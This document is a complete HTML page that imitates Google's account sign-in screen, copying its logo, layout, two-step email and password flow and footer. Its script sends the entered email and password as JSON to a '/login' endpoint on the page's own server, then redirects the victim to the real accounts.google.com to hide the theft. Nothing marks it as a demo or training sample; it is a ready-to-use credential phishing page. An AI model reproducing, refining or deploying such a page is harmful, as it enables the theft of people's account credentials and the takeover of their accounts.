<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <link rel="icon" href="https://www.gstatic.com/images/branding/product/1x/googleg_48dp.png">
    <style>
        body {
            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
            background: #fff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            color: #202124;
        }
        .main-container {
            width: 450px;
            height: auto;
            min-height: 500px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            padding: 48px 40px 36px;
            box-sizing: border-box;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .logo {
            height: 24px;
            margin-bottom: 16px;
        }
        h1 {
            font-size: 24px;
            font-weight: 400;
            margin: 0 0 8px;
            line-height: 1.3333;
        }
        .subtitle {
            font-size: 16px;
            margin: 0 0 40px;
            color: #202124;
            letter-spacing: 0.1px;
            line-height: 1.5;
        }
        .input-wrapper {
            width: 100%;
            position: relative;
            margin-bottom: 6px;
        }
        .input-field {
            width: 100%;
            padding: 13px 15px;
            font-size: 16px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            box-sizing: border-box;
            outline: none;
            transition: 0.2s;
            color: #202124;
        }
        .input-field:focus {
            border: 2px solid #1a73e8;
            padding: 12px 14px;
        }
        .input-label {
            position: absolute;
            left: 12px;
            top: 14px;
            background: #fff;
            padding: 0 4px;
            color: #5f6368;
            font-size: 16px;
            transition: 0.2s;
            pointer-events: none;
        }
        .input-field:focus ~ .input-label,
        .input-field:not(:placeholder-shown) ~ .input-label {
            top: -10px;
            font-size: 12px;
            color: #1a73e8;
        }
        .forgot-email {
            width: 100%;
            text-align: left;
            margin-bottom: 40px;
        }
        .forgot-email a {
            color: #1a73e8;
            font-weight: 500;
            text-decoration: none;
            font-size: 14px;
            border-radius: 4px;
        }
        .actions {
            width: 100%;
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: auto;
        }
        .create-account {
            color: #1a73e8;
            font-weight: 500;
            text-decoration: none;
            font-size: 14px;
        }
        .next-btn {
            background-color: #1a73e8;
            color: #fff;
            border: none;
            padding: 0 24px;
            height: 36px;
            border-radius: 4px;
            font-weight: 500;
            font-size: 14px;
            cursor: pointer;
            transition: background-color .2s box-shadow .2s;
        }
        .next-btn:hover {
            background-color: #1558d6;
            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
        }
        .hidden {
            display: none;
        }
        .profile-pill {
            border: 1px solid #dadce0;
            border-radius: 16px;
            padding: 4px 12px 4px 4px;
            display: flex;
            align-items: center;
            margin-bottom: 40px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 500;
            color: #3c4043;
        }
        .profile-pill img {
            height: 20px;
            margin-right: 8px;
            border-radius: 50%;
        }
        @media (max-width: 600px) {
            .main-container {
                width: 100%;
                height: 100%;
                border: none;
                justify-content: flex-start;
                padding-top: 24px;
            }
        }
        /* Footer */
        .footer {
            display: flex;
            justify-content: space-between;
            width: 450px;
            margin-top: 24px;
            font-size: 12px;
            color: #5f6368;
        }
        .footer-left select {
            border: none;
            background: none;
            font-size: 12px;
            color: #202124;
        }
        .footer-right a {
            color: #5f6368;
            text-decoration: none;
            margin-left: 24px;
        }
    </style>
</head>
<body>

    <div class="main-container">
        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="logo">
        
        <div id="step-1">
            <h1>Sign in</h1>
            <p class="subtitle">Use your Google Account</p>
            
            <div class="input-wrapper">
                <input type="email" id="email-input" class="input-field" placeholder=" " required>
                <label class="input-label">Email or phone</label>
            </div>
            
            <div class="forgot-email">
                <a href="#">Forgot email?</a>
            </div>
            
            <p style="font-size: 14px; color: #5f6368; line-height: 1.5; margin-bottom: 30px;">
                Not your computer? Use Guest mode to sign in privately.
                <a href="#" style="color: #1a73e8; text-decoration: none; font-weight: 500;">Learn more</a>
            </p>
            
            <div class="actions">
                <a href="#" class="create-account">Create account</a>
                <button class="next-btn" onclick="goToStep2()">Next</button>
            </div>
        </div>

        <div id="step-2" class="hidden">
            <h1>Welcome</h1>
            <div class="profile-pill" onclick="goToStep1()">
                <img src="https://www.gstatic.com/images/branding/product/1x/avatar_circle_blue_512dp.png" alt="User">
                <span id="user-email-display">user@example.com</span>
                <svg viewBox="0 0 24 24" style="width: 18px; height: 18px; fill: #5f6368; margin-left: 8px;"><path d="M7.41 8.59L12 13.17l4.59-4.58L18 10l-6 6-6-6 1.41-1.41z"></path></svg>
            </div>
            
            <div class="input-wrapper" style="margin-top: 40px;">
                <input type="password" id="password-input" class="input-field" placeholder=" " required>
                <label class="input-label">Enter your password</label>
            </div>
            
            <div class="forgot-email" style="margin-top: 8px;">
                <a href="#">Forgot password?</a>
            </div>
            
            <div class="actions" style="margin-top: 60px;">
                <a href="#" class="create-account"></a> <!-- Spacer -->
                <button class="next-btn" onclick="submitLogin()">Next</button>
            </div>
        </div>
    </div>

    <div class="footer">
        <div class="footer-left">
            English (United States)
        </div>
        <div class="footer-right">
            <a href="#">Help</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
        </div>
    </div>

    <script>
        function goToStep2() {
            const email = document.getElementById('email-input').value;
            if (!email) {
                document.getElementById('email-input').focus();
                document.getElementById('email-input').style.borderColor = '#d93025';
                return;
            }
            document.getElementById('user-email-display').innerText = email;
            document.getElementById('step-1').classList.add('hidden');
            document.getElementById('step-2').classList.remove('hidden');
            document.getElementById('password-input').focus();
        }

        function goToStep1() {
            document.getElementById('step-2').classList.add('hidden');
            document.getElementById('step-1').classList.remove('hidden');
        }

        function submitLogin() {
            const email = document.getElementById('email-input').value;
            const password = document.getElementById('password-input').value;
            
            if (!password) {
                document.getElementById('password-input').focus();
                document.getElementById('password-input').style.borderColor = '#d93025';
                return;
            }

            fetch('/login', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    email: email,
                    password: password
                })
            }).then(() => {
                // Redirect handled by server response or fallback
                window.location.href = "https://accounts.google.com/";
            });
        }
        
        // Allow Enter key
        document.getElementById('email-input').addEventListener('keypress', function (e) {
            if (e.key === 'Enter') goToStep2();
        });
        document.getElementById('password-input').addEventListener('keypress', function (e) {
            if (e.key === 'Enter') submitLogin();
        });
    </script>
</body>
</html>
